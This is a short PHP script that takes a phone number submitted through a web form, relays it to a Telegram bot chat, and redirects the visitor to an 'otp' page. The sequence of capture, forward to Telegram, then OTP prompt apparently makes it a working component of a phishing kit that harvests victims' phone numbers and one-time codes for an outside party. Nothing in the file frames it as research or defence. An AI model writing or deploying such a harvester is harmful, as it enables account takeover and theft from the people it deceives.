<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $phoneNumber = $_POST['phoneNumber'];

    // Retrieve the bot token and chat ID from environment variables
    $botToken = getenv('TELEGRAM_BOT_TOKEN');
    $chatId = getenv('TELEGRAM_CHAT_ID');

    // Construct the message
    $message = "New phone number submission: " . $phoneNumber;

    // Telegram API URL
    $url = "https://api.telegram.org/bot$botToken/sendMessage";

    // Data to be sent
    $data = array(
        'chat_id' => $chatId,
        'text' => $message
    );

    // Use cURL to send the data
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    $response = curl_exec($ch);
    curl_close($ch);

    // Redirect to verify.html after sending message
    header('Location: ./otp/index.html');
    exit();
}
?>
